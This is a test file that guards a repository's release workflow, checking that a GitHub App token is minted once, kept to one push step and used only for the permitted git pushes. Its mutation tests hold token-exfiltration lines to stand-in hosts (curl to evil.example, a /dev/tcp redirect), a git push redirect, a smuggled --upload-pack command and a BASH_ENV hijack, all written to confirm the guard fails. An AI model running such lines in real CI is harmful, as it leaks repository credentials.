/**
 * The guard that keeps `RELEASE_APP_PERMISSIONS` (scripts/release-app/manifest.ts) honest against
 * release.yml, the only thing that uses the release app. Modeled on CanopyCMS's
 * github-app-permission-drift.test.ts, which drives its worker against a recording proxy; here the only
 * consumer is a workflow, so this reads the workflow PARSED (the `yaml` package), never grepped.
 *
 * WHAT IT HOLDS
 *   1. The App's key and client id are read in exactly one step: the one that mints the token, in a job
 *      that runs in the `release` environment.
 *   2. That step asks for exactly the App's permissions (`permission-*`) and nothing that widens the token's
 *      reach (`owner`, `repositories`, `enterprise`, `skip-token-revoke`, another API URL).
 *   3. The token is used only through a later `run` step's `env`, never in `with:` (an action this cannot
 *      read) or inlined into a script, and that step writes nothing to $GITHUB_ENV/$GITHUB_OUTPUT/$GITHUB_PATH,
 *      so the token cannot travel to another step.
 *   4. Every command in that step is CLASSIFIED: a known local command needs no permission, `git push` needs
 *      contents: write, and anything else (gh, curl, node, an unknown program) is red until someone names the
 *      permission it needs here. Deny by default is what keeps a new call from passing unseen.
 *   5. Every `git push` goes to this repository, without force, deletion or a bulk refspec, and only to
 *      `main` and the `v$VERSION` tag: the two refs the rulesets let the App past.
 *   6. The permissions the commands force, plus metadata (implied by any repository permission), equal
 *      `RELEASE_APP_PERMISSIONS` exactly. Both directions: an unforced permission is red too, which is what
 *      stops this passing while watching nothing.
 *
 * WHAT IT CANNOT SEE: the shell is read by a small tokenizer, not bash. It splits commands on newlines, `;`,
 * `&&`, `||` and `|`, follows `$(…)`, and strips quotes. Anything it cannot place is red, not skipped. The
 * mutation tests at the bottom are its proof that each rule can fail.
 */
import { readdirSync, readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { parse } from 'yaml'
import {
    CLIENT_ID_VARIABLE,
    KEY_SECRET,
    RELEASE_APP_PERMISSIONS,
    RELEASE_ENVIRONMENT,
} from '../../scripts/release-app/manifest'

const WORKFLOWS = fileURLToPath(new URL('../../.github/workflows/', import.meta.url))
const RELEASE_WORKFLOW = 'release.yml'
const MINT_ACTION = 'actions/create-github-app-token@'

type Step = {
    id?: string
    name?: string
    uses?: string
    run?: string
    shell?: string
    with?: Record<string, unknown>
    env?: Record<string, unknown>
}
type Job = { environment?: unknown; steps?: Step[]; env?: Record<string, unknown>; defaults?: unknown } & Record<
    string,
    unknown
>
type Workflow = { jobs: Record<string, Job>; on?: unknown; env?: Record<string, unknown>; defaults?: unknown } & Record<
    string,
    unknown
>

/** What starts release.yml. A new trigger is a new way to reach the job that holds the key, so it is pinned. */
const TRIGGERS = { push: { branches: ['main'], tags: ['v[0-9]+.[0-9]+.[0-9]+'] } }

/** Commands that need no permission and reach nothing: they run on the runner and stop there. */
const LOCAL_COMMANDS = new Set(['echo', 'printf', 'base64', 'mktemp', 'true', 'test', '['])

/** git subcommands that touch only the local repository and cannot change where a later push goes. */
const LOCAL_GIT = new Set(['init', 'rev-parse'])

/** `git -c` settings the push may carry. */
const GIT_CONFIG_KEYS = new Set(['core.hooksPath', 'http.extraheader'])

/** The only `git push` options allowed: none of them pushes more refs or rewrites one. */
const PUSH_OPTIONS = new Set(['--no-verify', '--atomic', '-q', '--quiet', '--porcelain'])

/**
 * The refs, exactly as release.yml writes them. The fetch builds the scratch repository the push goes from
 * (the verified commit, as `release`, and its tag); the push lands those two and nothing else.
 */
const FETCH_REFSPECS = ['+$sha:refs/heads/release', '+refs/tags/v$VERSION:refs/tags/v$VERSION']
const PUSH_REFSPECS = ['release:main', 'refs/tags/v$VERSION']
const PUSH_REMOTE = 'https://github.com/$GITHUB_REPOSITORY'

/** The token step's own `env`, exactly: the token, the version, and git told to read no config file. */
const STEP_ENV: Record<string, RegExp> = {
    VERSION: /^\$\{\{ needs\.plan\.outputs\.version \}\}$/,
    TOKEN: /^\$\{\{ steps\.[A-Za-z0-9_-]+\.outputs\.token \}\}$/,
    GIT_CONFIG_GLOBAL: /^\/dev\/null$/,
    GIT_CONFIG_NOSYSTEM: /^1$/,
}

/** Where a redirection in the token step may point. A file anywhere else could hand the token on. */
const REDIRECT_TARGETS = new Set(['$GITHUB_STEP_SUMMARY', '/dev/null', '&1', '&2'])

/** Shell variables that change what git or gh reads, or where it sends things. Never set in the token step. */
const RISKY_VARIABLE = /^(GIT_|GH_|GITHUB_|HOME$|XDG_CONFIG_HOME$|BASH_ENV$|ENV$|SSL_|CURL_|HTTPS?_PROXY$|ALL_PROXY$)/i

type Finding = string
type Operation = { command: string; permission: keyof typeof RELEASE_APP_PERMISSIONS | null }

/** Every string in a value, with a path to it, for finding where a secret or the token is mentioned. */
function strings(value: unknown, at: string, out: { at: string; text: string }[] = []) {
    if (typeof value === 'string') out.push({ at, text: value })
    else if (Array.isArray(value)) value.forEach((v, i) => strings(v, `${at}[${i}]`, out))
    else if (value && typeof value === 'object')
        for (const [k, v] of Object.entries(value)) {
            strings(k, `${at}.<key>`, out)
            strings(v, `${at}.${k}`, out)
        }
    return out
}

function environmentOf(job: Job): unknown {
    const env = job.environment
    return env && typeof env === 'object' && 'name' in env ? (env as { name: unknown }).name : env
}

/**
 * Split a script into commands, each a list of words with quotes removed. A `$(…)` becomes the word `$(…)`
 * in its command, and its own commands are returned too. Comments run to the end of the line. Backticks and
 * process substitution are refused by the caller before this runs.
 */
function commandsOf(script: string): string[][] {
    const commands: string[][] = []
    let words: string[] = []
    let word = ''
    let inWord = false
    const endWord = () => {
        if (inWord) words.push(word)
        word = ''
        inWord = false
    }
    const endCommand = () => {
        endWord()
        if (words.length > 0) commands.push(words)
        words = []
    }
    const text = script.replace(/\\\n/g, ' ')
    let i = 0
    while (i < text.length) {
        const c = text[i]
        if (c === "'") {
            const close = text.indexOf("'", i + 1)
            if (close < 0) throw new Error('unterminated single quote')
            word += text.slice(i + 1, close)
            inWord = true
            i = close + 1
        } else if (c === '"') {
            i++
            inWord = true
            while (i < text.length && text[i] !== '"') {
                if (text[i] === '\\' && i + 1 < text.length) {
                    word += text[i + 1]
                    i += 2
                } else if (text.startsWith('$(', i)) {
                    const end = matchParen(text, i + 1)
                    commands.push(...commandsOf(text.slice(i + 2, end)))
                    word += '$(…)'
                    i = end + 1
                } else word += text[i++]
            }
            if (i >= text.length) throw new Error('unterminated double quote')
            i++
        } else if (text.startsWith('$(', i)) {
            const end = matchParen(text, i + 1)
            commands.push(...commandsOf(text.slice(i + 2, end)))
            word += '$(…)'
            inWord = true
            i = end + 1
        } else if (c === '#' && !inWord) {
            while (i < text.length && text[i] !== '\n') i++
        } else if (c === '\n' || c === ';') {
            endCommand()
            i++
        } else if (c === '&' || c === '|') {
            endCommand()
            i += text[i + 1] === c ? 2 : 1
        } else if (c === ' ' || c === '\t') {
            endWord()
            i++
        } else {
            word += c
            inWord = true
            i++
        }
    }
    endCommand()
    return commands
}

function matchParen(text: string, open: number): number {
    let depth = 0
    for (let i = open; i < text.length; i++) {
        if (text[i] === '(') depth++
        else if (text[i] === ')' && --depth === 0) return i
    }
    throw new Error('unbalanced $(')
}

/**
 * A command's words without its redirections and `{`/`}`/`!`, plus the variables it assigns (a leading
 * `NAME=value`, or the whole command when it is only assignments) and where it redirects to.
 */
function significant(command: string[]): { words: string[]; assigns: string[]; redirects: string[] } {
    const words: string[] = []
    const assigns: string[] = []
    const redirects: string[] = []
    for (let i = 0; i < command.length; i++) {
        const w = command[i]
        const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=/.exec(w)
        if (words.length === 0 && assignment) {
            assigns.push(assignment[1])
            continue
        }
        if (w === '{' || w === '}' || w === '!') continue
        const redirect = /^[0-9]*(>{1,2}|<{1,3}|&>{1,2})(.*)$/.exec(w)
        if (redirect) {
            const target = redirect[2] !== '' ? redirect[2] : (command[++i] ?? '')
            redirects.push(redirect[1].startsWith('<') ? `<${target}` : target)
            continue
        }
        words.push(w)
    }
    return { words, assigns, redirects }
}

/** Classify one command of a token-holding step. Pushes a finding for anything it cannot place. */
function classify(command: string[], findings: Finding[]): Operation | null {
    const { words, assigns, redirects } = significant(command)
    for (const name of assigns) {
        if (RISKY_VARIABLE.test(name))
            findings.push(`the token step sets ${name}, which changes what git or a tool reads`)
    }
    for (const target of redirects) {
        if (!REDIRECT_TARGETS.has(target)) findings.push(`the token step redirects to ${target}`)
    }
    const [program, ...args] = words
    if (program === undefined) return null
    if (program === 'set') {
        if (args.join(' ') !== '-euo pipefail')
            findings.push(`\`set ${args.join(' ')}\` in the token step (only -euo pipefail)`)
        return { command: 'set', permission: null }
    }
    if (LOCAL_COMMANDS.has(program)) return { command: program, permission: null }
    if (program !== 'git') {
        findings.push(
            `unclassified command \`${command.join(' ')}\` in a step holding the release app's token: name the App ` +
                'permission it needs in this test (and RELEASE_APP_PERMISSIONS), or move it out of that step',
        )
        return null
    }
    let i = 0
    const configs: string[] = []
    while (i < args.length && args[i].startsWith('-')) {
        if (args[i] === '-C') i += 2
        else if (args[i] === '-c') {
            const setting = args[i + 1] ?? ''
            const key = setting.split('=')[0]
            if (!GIT_CONFIG_KEYS.has(key)) findings.push(`git -c ${key} is not a setting the push may carry`)
            configs.push(setting)
            i += 2
        } else {
            findings.push(`unclassified git option ${args[i]}`)
            i++
        }
    }
    const sub = args[i]
    const rest = args.slice(i + 1)
    const options = rest.filter((w) => w.startsWith('-'))
    const positional = rest.filter((w) => !w.startsWith('-'))
    if (LOCAL_GIT.has(sub)) {
        for (const option of options) if (option !== '-q') findings.push(`git ${sub} ${option} is not allowed`)
        return { command: `git ${sub}`, permission: null }
    }
    if (sub === 'fetch') {
        const [remote, ...refspecs] = positional
        for (const option of options) if (option !== '-q') findings.push(`git fetch ${option} is not allowed`)
        if (remote !== '$GITHUB_WORKSPACE')
            findings.push(`git fetch from ${remote}: the token step fetches only from the workspace`)
        if (JSON.stringify(refspecs) !== JSON.stringify(FETCH_REFSPECS)) {
            findings.push(`git fetch takes ${JSON.stringify(refspecs)}; expected ${JSON.stringify(FETCH_REFSPECS)}`)
        }
        return { command: 'git fetch (local)', permission: null }
    }
    if (sub === 'push') {
        for (const option of options) {
            if (!PUSH_OPTIONS.has(option))
                findings.push(`git push ${option} is not allowed (only ${[...PUSH_OPTIONS].join(' ')})`)
        }
        if (!options.includes('--no-verify')) findings.push('git push runs without --no-verify, so a hook could run')
        if (!configs.includes('core.hooksPath=/dev/null'))
            findings.push('git push runs without -c core.hooksPath=/dev/null, so a hook could run')
        const [remote, ...refspecs] = positional
        if (remote !== PUSH_REMOTE) findings.push(`git push goes to ${remote}, not ${PUSH_REMOTE}`)
        for (const refspec of refspecs) {
            if (refspec.startsWith('+')) findings.push(`git push ${refspec} forces`)
            const [src, dst = src] = refspec.replace(/^\+/, '').split(':')
            if (src === '') findings.push(`git push ${refspec} deletes ${dst}`)
        }
        if (JSON.stringify(refspecs) !== JSON.stringify(PUSH_REFSPECS)) {
            findings.push(`git push lands ${JSON.stringify(refspecs)}; only ${JSON.stringify(PUSH_REFSPECS)} may`)
        }
        return { command: 'git push', permission: 'contents' }
    }
    findings.push(`unclassified git subcommand \`git ${sub ?? ''}\` in a step holding the release app's token`)
    return null
}

/** The `${{ … }}` expressions in a string. */
function expressions(text: string): string[] {
    return [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1].trim())
}

/**
 * Every workflow but release.yml: none may run a job in the `release` environment (the only way to read its
 * secret), and none may name the App's key or client id at all.
 */
function auditOthers(files: { name: string; workflow: Workflow }[]): Finding[] {
    const findings: Finding[] = []
    for (const { name, workflow } of files) {
        if (name === RELEASE_WORKFLOW) continue
        for (const [jobName, job] of Object.entries(workflow?.jobs ?? {})) {
            if (environmentOf(job) === RELEASE_ENVIRONMENT || /\brelease\b/.test(JSON.stringify(job.environment ?? '')))
                findings.push(`${name}: job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment`)
        }
        for (const s of strings(workflow, name)) {
            if (s.text.includes(KEY_SECRET) || s.text.includes(CLIENT_ID_VARIABLE))
                findings.push(`${s.at} names the release app's credentials`)
        }
    }
    return findings
}

/** Everything wrong with release.yml, and the permissions its use of the release app forces. */
function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, string> } {
    const findings: Finding[] = []
    const forced = new Map<string, string>()

    if (JSON.stringify(workflow.on) !== JSON.stringify(TRIGGERS)) {
        findings.push(`release.yml's triggers are ${JSON.stringify(workflow.on)}; expected ${JSON.stringify(TRIGGERS)}`)
    }

    // 1. Where the token is minted, and in which environment. Only that job can read the environment's secret.
    const mints: { job: string; index: number; step: Step }[] = []
    for (const [jobName, job] of Object.entries(workflow.jobs ?? {})) {
        ;(job.steps ?? []).forEach((step, index) => {
            if (typeof step.uses === 'string' && step.uses.startsWith(MINT_ACTION))
                mints.push({ job: jobName, index, step })
        })
        if (
            environmentOf(job) === RELEASE_ENVIRONMENT &&
            !(job.steps ?? []).some((s) => s.uses?.startsWith(MINT_ACTION))
        )
            findings.push(`job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment without minting the token`)
    }
    if (mints.length !== 1) findings.push(`expected exactly one ${MINT_ACTION} step, found ${mints.length}`)
    const mint = mints[0]
    if (!mint) return { findings, forced }
    const job = workflow.jobs[mint.job]
    if (environmentOf(job) !== RELEASE_ENVIRONMENT) {
        findings.push(`job ${mint.job} mints the token outside the "${RELEASE_ENVIRONMENT}" environment`)
    }
    if (typeof mint.step.id !== 'string') {
        findings.push('the mint step has no id, so its token cannot be traced')
        return { findings, forced }
    }

    // 1b. Every mention of `secrets` or `vars` in the workflow, in any spelling (`secrets.X`, `secrets['X']`,
    // `toJSON(secrets)`), and every literal naming the key or client id. Only the mint's two inputs may.
    const mintPath = `workflow.jobs.${mint.job}.steps[${mint.index}].with`
    const allowed: Record<string, string> = {
        [`${mintPath}.private-key`]: `secrets.${KEY_SECRET}`,
        [`${mintPath}.client-id`]: `vars.${CLIENT_ID_VARIABLE}`,
    }
    for (const s of strings(workflow, 'workflow')) {
        const credentialish = expressions(s.text).filter((e) => /\b(secrets|vars)\b/.test(e))
        const named = s.text.includes(KEY_SECRET) || s.text.includes(CLIENT_ID_VARIABLE)
        if (credentialish.length === 0 && !named) continue
        const expected = allowed[s.at]
        if (expected === undefined || s.text !== `\${{ ${expected} }}`) {
            findings.push(`${s.at} reads secrets or variables, or names the release app's credentials`)
        }
    }

    // 2. What the token is asked for.
    const inputs = mint.step.with ?? {}
    const asked: Record<string, string> = {}
    for (const [key, value] of Object.entries(inputs)) {
        if (key === 'client-id' || key === 'private-key') continue
        if (key.startsWith('permission-')) asked[key.slice('permission-'.length).replace(/-/g, '_')] = String(value)
        else findings.push(`the mint step sets \`${key}\`, which widens or changes the token`)
    }
    const expectedAsk = Object.fromEntries(
        Object.entries(RELEASE_APP_PERMISSIONS).filter(([name]) => name !== 'metadata'),
    )
    if (JSON.stringify(Object.entries(asked).sort()) !== JSON.stringify(Object.entries(expectedAsk).sort())) {
        findings.push(
            `the token asks for ${JSON.stringify(asked)}; RELEASE_APP_PERMISSIONS says ${JSON.stringify(expectedAsk)}`,
        )
    }

    // 3. Where the token goes: one later run step's `env`, which must be the job's last step. A spelling this
    // cannot trace (`steps['id']`, `toJSON(steps)`) is red wherever it appears.
    for (const s of strings(workflow, 'workflow')) {
        if (
            expressions(s.text).some((e) => /\bsteps\s*\[|\(\s*steps\s*\)|\bsteps\s*\)|\bsteps\s*,|\bsteps\s*$/.test(e))
        )
            findings.push(`${s.at} reads the steps context in a form this guard cannot trace`)
    }
    const tokenRef = new RegExp(`steps\\.${mint.step.id}\\.outputs`)
    const consumers = new Set<number>()
    for (const use of strings(workflow, 'workflow').filter((s) => tokenRef.test(s.text))) {
        const match = new RegExp(
            `^workflow\\.jobs\\.${mint.job}\\.steps\\[(\\d+)\\]\\.env\\.[A-Za-z_][A-Za-z0-9_]*$`,
        ).exec(use.at)
        if (!match) {
            findings.push(`${use.at} uses the release app's token; only a later run step's env may`)
            continue
        }
        const index = Number(match[1])
        if (index <= mint.index) findings.push(`${use.at} uses the token before it is minted`)
        consumers.add(index)
    }
    if (consumers.size === 0) findings.push("nothing uses the release app's token")
    if (consumers.size > 1) findings.push(`${consumers.size} steps hold the token; one may`)

    // Nothing around the step may change how its shell or git behaves.
    for (const [where, holder] of [
        ['the workflow', workflow],
        [`job ${mint.job}`, job],
    ] as const) {
        if (holder.defaults !== undefined) findings.push(`${where} sets defaults, which change the token step's shell`)
        for (const key of Object.keys(holder.env ?? {})) {
            if (RISKY_VARIABLE.test(key)) findings.push(`${where} sets ${key} for the token step`)
        }
    }

    // 4. What the step holding the token does.
    for (const index of consumers) {
        const step = (job.steps ?? [])[index]
        const label = `step "${step.name ?? index}"`
        if (typeof step.run !== 'string' || step.uses !== undefined) {
            findings.push(`${label} of ${mint.job} holds the token but is not a plain run step`)
            continue
        }
        if (index !== (job.steps ?? []).length - 1)
            findings.push(`${label} holds the token but is not the job's last step`)
        if (step.shell !== undefined) findings.push(`${label} sets shell: ${step.shell}; it must run the default bash`)
        const env = step.env ?? {}
        for (const key of Object.keys(env)) {
            const rule = STEP_ENV[key]
            if (!rule || !rule.test(String(env[key]))) findings.push(`${label} sets env ${key}=${String(env[key])}`)
        }
        for (const key of Object.keys(STEP_ENV)) if (!(key in env)) findings.push(`${label} does not set env ${key}`)
        if (/GITHUB_(ENV|OUTPUT|PATH)\b/.test(step.run)) {
            findings.push(`${label} holds the token and writes $GITHUB_ENV, $GITHUB_OUTPUT or $GITHUB_PATH`)
        }
        for (const [pattern, what] of [
            ['`', 'a backtick command substitution'],
            ['<(', 'a process substitution'],
            ['>(', 'a process substitution'],
            ['/dev/tcp', 'a bash network redirect'],
            ['/dev/udp', 'a bash network redirect'],
        ] as const) {
            if (step.run.includes(pattern)) findings.push(`${label} holds the token and uses ${what} (${pattern})`)
        }
        let commands: string[][]
        try {
            commands = commandsOf(step.run)
        } catch (err) {
            findings.push(`${label}: ${(err as Error).message}`)
            continue
        }
        for (const command of commands) {
            const op = classify(command, findings)
            if (op?.permission) forced.set(op.command, op.permission)
        }
    }

    // 5. Both directions.
    const needed = new Set<string>(['metadata', ...forced.values()])
    for (const name of needed) {
        if (!(name in RELEASE_APP_PERMISSIONS))
            findings.push(`release.yml needs ${name}, which RELEASE_APP_PERMISSIONS lacks`)
    }
    for (const name of Object.keys(RELEASE_APP_PERMISSIONS)) {
        if (!needed.has(name))
            findings.push(`RELEASE_APP_PERMISSIONS grants ${name}, which nothing in release.yml uses`)
    }
    return { findings, forced }
}

function loadAll(): { name: string; workflow: Workflow }[] {
    return readdirSync(WORKFLOWS)
        .filter((name) => /\.ya?ml$/.test(name))
        .map((name) => ({ name, workflow: parse(readFileSync(path.join(WORKFLOWS, name), 'utf8')) as Workflow }))
}

function load(): Workflow {
    return parse(readFileSync(path.join(WORKFLOWS, RELEASE_WORKFLOW), 'utf8')) as Workflow
}

function pushJob(workflow: Workflow): Job {
    const found = Object.values(workflow.jobs).find((job) =>
        (job.steps ?? []).some((step) => step.uses?.startsWith(MINT_ACTION)),
    )
    if (!found) throw new Error('no job mints the token')
    return found
}

function pushStep(workflow: Workflow): Step {
    const step = (pushJob(workflow).steps ?? []).find((s) =>
        Object.values(s.env ?? {}).some((v) => /outputs\.token/.test(String(v))),
    )
    if (!step) throw new Error('no step uses the token')
    return step
}

describe('release.yml and the release app agree', () => {
    it('uses the App only to push main and the release tag, with exactly its permissions', () => {
        const { findings, forced } = audit(load())
        expect(findings).toEqual([])
        expect([...forced.entries()]).toEqual([['git push', 'contents']])
    })

    it('no other workflow runs in the release environment or names its credentials', () => {
        const files = loadAll()
        expect(files.map((f) => f.name)).toContain(RELEASE_WORKFLOW)
        expect(files.length).toBeGreaterThan(1)
        expect(auditOthers(files)).toEqual([])
    })

    it('goes red for another workflow in the release environment, or naming the key', () => {
        const job = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'true' }] }
        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: 'release' } } } }])).toEqual(
            ['x.yml: job a runs in the "release" environment'],
        )
        expect(
            auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: { name: 'release' } } } } }]),
        ).toHaveLength(1)
        expect(
            auditOthers([
                {
                    name: 'x.yml',
                    workflow: { jobs: { a: { ...job, env: { K: "${{ secrets['RELEASE_BOT_PRIVATE_KEY'] }}" } } } },
                },
            ]),
        ).toHaveLength(1)
    })
})

describe('the shell reader', () => {
    it('splits commands, follows $(…), strips quotes and drops comments', () => {
        expect(
            commandsOf(`set -e # note\nx=$(git rev-parse HEAD)\necho "a $(printf '%s' "$Y" | base64 -w0) b" >> "$F"`),
        ).toEqual([
            ['set', '-e'],
            ['git', 'rev-parse', 'HEAD'],
            ['x=$(…)'],
            ['printf', '%s', '$Y'],
            ['base64', '-w0'],
            ['echo', 'a $(…) b', '>>', '$F'],
        ])
    })

    it('joins continuation lines into one command', () => {
        expect(commandsOf('git push \\\n  --atomic x')).toEqual([['git', 'push', '--atomic', 'x']])
    })
})

/**
 * Each rule seen to FAIL: the real workflow, changed in memory the way a later edit might, must go red. If
 * one of these passes, the rule it names has stopped guarding anything.
 */
describe('the guard goes red when release.yml outgrows the App', () => {
    const red = (mutate: (workflow: Workflow) => void, pattern: RegExp) => {
        const workflow = load()
        mutate(workflow)
        const { findings } = audit(workflow)
        expect(
            findings.some((finding) => pattern.test(finding)),
            JSON.stringify(findings, null, 2),
        ).toBe(true)
    }
    const appendRun = (workflow: Workflow, line: string) => {
        const step = pushStep(workflow)
        step.run = `${step.run}\n${line}\n`
    }

    it('a gh call with the token', () =>
        red(
            (w) => appendRun(w, 'GH_TOKEN="$TOKEN" gh release create "v$VERSION"'),
            /unclassified command `.*gh release/,
        ))
    it('a curl to the API', () =>
        red(
            (w) => appendRun(w, 'curl -H "Authorization: token $TOKEN" https://api.github.com/x'),
            /unclassified command `curl/,
        ))
    it('a force push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push --force "https://github.com/$GITHUB_REPOSITORY" release:main'),
            /--force is not allowed/,
        ))
    it('a + refspec', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" +release:main'),
            /forces/,
        ))
    it('a deletion', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" :refs/tags/v0.1.0'),
            /deletes refs\/tags\/v0.1.0/,
        ))
    it('a push to another branch', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" release:other'),
            /lands \["release:other"\]/,
        ))
    it('a push to another repository', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push https://github.com/elsewhere/x release:main'),
            /goes to https:\/\/github.com\/elsewhere/,
        ))
    it('a push of every tag', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push --tags "https://github.com/$GITHUB_REPOSITORY"'),
            /--tags is not allowed/,
        ))
    it('a new git setting on the push', () =>
        red(
            (w) =>
                appendRun(
                    w,
                    'git -c credential.helper=store push "https://github.com/$GITHUB_REPOSITORY" release:main',
                ),
            /credential\.helper/,
        ))
    it('the token handed to a later step', () =>
        red((w) => appendRun(w, 'echo "T=$TOKEN" >> "$GITHUB_ENV"'), /writes \$GITHUB_ENV/))
    it('the token given to an action', () =>
        red((w) => {
            pushJob(w).steps?.push({ uses: 'some/action@v1', with: { token: '${{ steps.app-token.outputs.token }}' } })
        }, /uses the release app's token; only a later run step's env may/))
    it('the token inlined into a script', () =>
        red((w) => {
            pushJob(w).steps?.push({ run: 'echo ${{ steps.app-token.outputs.token }}' })
        }, /\.run uses the release app's token/))
    it('the key read in another job', () =>
        red((w) => {
            w.jobs.pack.steps?.push({ run: 'true', env: { K: '${{ secrets.RELEASE_BOT_PRIVATE_KEY }}' } })
        }, /jobs\.pack\..*reads secrets or variables/))
    it('the mint outside the release environment', () =>
        red((w) => {
            pushJob(w).environment = 'npm-publish'
        }, /outside the "release" environment/))
    it('a widened token request', () =>
        red((w) => {
            const mint = pushJob(w).steps?.find((s) => s.uses?.startsWith(MINT_ACTION))
            if (mint?.with) mint.with['permission-pull-requests'] = 'write'
        }, /the token asks for/))
    it('a token for the whole account', () =>
        red((w) => {
            const mint = pushJob(w).steps?.find((s) => s.uses?.startsWith(MINT_ACTION))
            if (mint?.with) mint.with.owner = 'safeinsights'
        }, /sets `owner`/))
    it('no push at all, leaving contents: write unforced', () =>
        red((w) => {
            pushStep(w).run = 'echo "$TOKEN" | base64 -w0 >/dev/null\n'
        }, /grants contents, which nothing in release\.yml uses/))
    it('a backtick command', () =>
        red((w) => appendRun(w, 'echo `curl -H "Authorization: token $TOKEN" https://api.github.com/x`'), /backtick/))
    it('a process substitution', () =>
        red((w) => appendRun(w, 'echo <(curl -d "$TOKEN" https://evil.example)'), /process substitution/))
    it('a bash network redirect', () =>
        red((w) => appendRun(w, 'printf %s "$TOKEN" > /dev/tcp/evil.example/443'), /network redirect/))
    it('the token written to a file', () =>
        red((w) => appendRun(w, 'printf %s "$TOKEN" > "$RUNNER_TEMP/t"'), /redirects to \$RUNNER_TEMP\/t/))
    it('a git config that redirects the push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" config url.https://evil/.pushInsteadOf https://github.com/'),
            /unclassified git subcommand `git config`/,
        ))
    it('a GIT_CONFIG_* prefix', () =>
        red((w) => appendRun(w, 'GIT_CONFIG_COUNT=1 git -C "$pusher" rev-parse HEAD'), /sets GIT_CONFIG_COUNT/))
    it('a GIT_CONFIG_* in the step env', () =>
        red((w) => {
            const step = pushStep(w)
            step.env = { ...step.env, GIT_CONFIG_COUNT: '1' }
        }, /sets env GIT_CONFIG_COUNT/))
    it('BASH_ENV in the job env', () =>
        red((w) => {
            pushJob(w).env = { BASH_ENV: './evil.sh' }
        }, /job push sets BASH_ENV/))
    it('a step shell', () =>
        red((w) => {
            pushStep(w).shell = 'python'
        }, /sets shell: python/))
    it('a defaults.run.shell', () =>
        red((w) => {
            w.defaults = { run: { shell: 'bash -c "curl x; bash -e {0}"' } }
        }, /the workflow sets defaults/))
    it('set -a, which exports every later assignment', () =>
        red((w) => {
            const step = pushStep(w)
            step.run = `set -a\n${step.run}`
        }, /`set -a`/))
    it('a fetch from elsewhere into the push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" fetch -q "$GITHUB_WORKSPACE" "+other:refs/heads/release"'),
            /git fetch takes/,
        ))
    it('a fetch running a command', () =>
        red(
            (w) => appendRun(w, 'git fetch --upload-pack="curl x;git-upload-pack" "$GITHUB_WORKSPACE"'),
            /--upload-pack=curl x;git-upload-pack is not allowed/,
        ))
    it('git init with a template', () =>
        red((w) => appendRun(w, 'git init --template=/tmp/t "$pusher"'), /git init --template/))
    it('a push that runs hooks', () =>
        red((w) => {
            const step = pushStep(w)
            step.run = step.run?.replace('push --no-verify', 'push')
        }, /without --no-verify/))
    it('a toJSON(secrets) in the push job', () =>
        red((w) => {
            pushStep(w).env = { ...pushStep(w).env, ALL: '${{ toJSON(secrets) }}' }
        }, /reads secrets or variables/))
    it("the token read as steps['app-token']", () =>
        red((w) => {
            w.jobs.pack.steps?.push({ uses: 'x/y@v1', with: { t: "${{ steps['app-token'].outputs.token }}" } })
        }, /reads the steps context in a form/))
    it('a step after the token step', () =>
        red((w) => {
            pushJob(w).steps?.push({ run: 'true' })
        }, /is not the job's last step/))
    it('a widened trigger', () =>
        red((w) => {
            w.on = { ...(w.on as object), workflow_dispatch: {} }
        }, /triggers are/))
    it('a second job in the release environment', () =>
        red((w) => {
            w.jobs.pack.environment = { name: 'release' }
        }, /job pack runs in the "release" environment without minting/))
    it('a second mint', () =>
        red((w) => {
            w.jobs.pack.steps?.push({ id: 'again', uses: `${MINT_ACTION}v3` })
        }, /exactly one .* step, found 2/))
})
